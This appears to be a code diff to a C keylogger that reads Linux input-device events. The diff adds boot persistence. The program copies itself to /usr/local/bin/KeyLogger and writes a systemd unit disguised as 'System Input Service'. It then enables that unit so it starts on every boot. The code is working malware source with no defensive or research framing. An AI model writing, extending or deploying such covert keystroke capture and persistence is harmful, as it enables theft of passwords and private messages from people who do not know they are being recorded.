@@ -84,6 +84,7 @@ int fd;
 int caps_active = 0;
 int shift_active = 0;
 
+//function isnt needed after making the program run on boot!
 void make_daemon(){
   pid_t pid = fork();
 
@@ -165,26 +166,73 @@ void readingDevicesFile(){
   fclose(fp);
 }
 
+void createServiceFile(){
+  FILE *fp = fopen("/etc/systemd/system/KeyLogger.service", "w");
+  if (fp == NULL){
+    perror("Error trying to create the .system file");
+    exit(EXIT_FAILURE);
+  }
 
+  fprintf(fp, "[Unit]\n");
+  fprintf(fp, "Description=System Input Service\n");
+  fprintf(fp, "After=local-fs.target\n\n");
+  fprintf(fp, "[Service]\n");
+  fprintf(fp, "Type=simple\n");
+  fprintf(fp, "ExecStart=/usr/local/bin/KeyLogger\n"); // Points to the NEW location
+  fprintf(fp, "Restart=always\n\n");
+  fprintf(fp, "[Install]\n");
+  fprintf(fp, "WantedBy=multi-user.target\n");
+
+  fclose(fp);
+}
+
+void runOnBoot(char cur_path[1024]){
+  printf("Detected a new version. Installing...\n");
+
+  system("systemctl stop KeyLogger.service 2>/dev/null");
+
+  char cmd[2048];
+  snprintf(cmd, sizeof(cmd), "cp %s /usr/local/bin/KeyLogger", cur_path);
+
+  if(system(cmd) == -1){
+    perror("Error while trying to copy the file to /usr/local/bin/KeyLogger");
+    exit(EXIT_FAILURE);
+  }
+
+  if (system("chmod +x /usr/local/bin/KeyLogger") != 0)
+  {
+    perror("Error while trying to change premission of the program");
+    exit(EXIT_FAILURE);
+  }
+
+  createServiceFile();
+
+  system("systemctl daemon-reload");
+  system("systemctl enable KeyLogger.service --now");
+
+  exit(EXIT_SUCCESS);   
+}
 
 int main(int argc, char const *argv[])
 {
-  printf("%s\n", DEVICE_INPUT_PATH);
+  char cur_path[1024];
+  ssize_t len = readlink("/proc/self/exe", cur_path, sizeof(cur_path) - 1);
+  cur_path[len] = '\0';
+  if (strcmp(cur_path,"/usr/local/bin/KeyLogger") != 0){
+    runOnBoot(cur_path);
+    printf("finished runOnBoot\n");
+  }
+  else{
+    printf("your good\n");
+  }
+
+
   readingDevicesFile();
   printf("%s\n", DEVICE_INPUT_PATH);
 
   //opening /input file descriptor
 	
   struct input_event ev;
-  fd = open(DEVICE_INPUT_PATH, O_RDONLY);
-  if (fd == -1) {
-  	perror("Error while opening the device file");
-  	printf("maybe you need root privilege...");
-  }
-  printf("this is my fd: %d\n", fd);  
-  close(fd);
-
-  make_daemon();
 
   signal(SIGINT, cleanNexit);
   signal(SIGTERM, cleanNexit);
